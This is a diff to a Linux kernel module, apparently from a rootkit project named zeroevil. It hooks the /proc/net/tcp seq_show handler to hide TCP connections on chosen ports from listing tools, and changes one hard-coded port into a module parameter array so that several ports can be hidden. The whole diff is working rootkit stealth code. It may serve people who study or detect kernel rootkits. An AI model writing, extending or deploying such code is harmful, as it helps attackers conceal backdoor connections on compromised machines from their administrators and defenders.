@@ -25,6 +25,7 @@
 # include <net/tcp.h> // struct tcp_seq_afinfo.
 # endif // CPP
 
+//#define DEBUG
 # include "zeroevil/zeroevil.h"
 
 
@@ -32,9 +33,13 @@ MODULE_LICENSE("GPL");
 
 # define NET_ENTRY "/proc/net/tcp"
 # define SEQ_AFINFO_STRUCT struct tcp_seq_afinfo
-# define SECRET_PORT 53
 # define NEEDLE_LEN 6
 # define TMPSZ 150
+
+static unsigned short secret_ports[10];
+static unsigned int secret_ports_c;
+module_param_array_named(ports, secret_ports, ushort, &secret_ports_c, S_IRUGO);
+MODULE_PARM_DESC(ports, "hidden ports");
 
 int
 (*real_seq_show)(struct seq_file *seq, void *v);
@@ -73,14 +78,16 @@ fake_seq_show(struct seq_file *seq, void *v)
 {
     int ret;
     char needle[NEEDLE_LEN];
-
-    snprintf(needle, NEEDLE_LEN, ":%04X", SECRET_PORT);
+    int i;
     ret = real_seq_show(seq, v);
 
-    if (strnstr(seq->buf + seq->count - TMPSZ, needle, TMPSZ)) {
-        fm_alert("Hiding port %d using needle %s.\n",
-                 SECRET_PORT, needle);
-        seq->count -= TMPSZ;
+    for (i=0; i<secret_ports_c; i++) {
+        snprintf(needle, NEEDLE_LEN, ":%04X", secret_ports[i]);
+        if (strnstr(seq->buf + seq->count - TMPSZ, needle, TMPSZ)) {
+            fm_alert("Hiding port %d using needle %s.\n", secret_ports[i], needle);
+            seq->count -= TMPSZ;
+            break;
+        }
     }
 
     return ret;
